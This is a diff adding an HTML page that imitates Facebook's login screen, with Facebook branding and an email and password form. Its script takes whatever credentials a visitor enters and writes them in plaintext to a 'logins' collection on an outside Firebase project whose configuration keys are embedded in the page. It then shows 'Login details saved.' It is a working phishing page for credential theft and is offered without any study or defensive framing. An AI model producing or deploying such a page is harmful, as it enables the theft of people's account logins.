@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Page | CodingNepal</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Add Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore.js"></script>
+    <script>
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyC2SZtgTQVFuPeCyZ5U95ytIXMan_ZWVfs",
+            authDomain: "ejjay-9667c.firebaseapp.com",
+            projectId: "ejjay-9667c",
+            storageBucket: "ejjay-9667c.appspot.com",
+            messagingSenderId: "736207993735",
+            appId: "1:736207993735:web:10da1b6f2dabdab3f77122",
+            measurementId: "G-DKWYDJP4BW"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+    </script>
+</head>
+<body>
+    <div class="container flex">
+        <div class="facebook-page flex">
+            <div class="text">
+                <h1>Facebook</h1>
+                <p>Connect with friends and the world</p>
+                <p>around you on Facebook.</p>
+            </div>
+            <form id="loginForm">
+                <input type="text" id="email" name="email" placeholder="Email or phone number" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <div class="link">
+                    <button type="submit" class="login">Login</button>
+                    <a href="#" class="forgot">Forgot password?</a>
+                </div>
+                <hr>
+                <div class="button">
+                    <a href="#">Create new account</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Save to Firestore
+            db.collection("logins").add({
+                email: email,
+                password: password
+            })
+            .then(() => {
+                alert("Login details saved.");
+            })
+            .catch((error) => {
+                console.error("Error writing document: ", error);
+            });
+        });
+    </script>
+</body>
+</html>
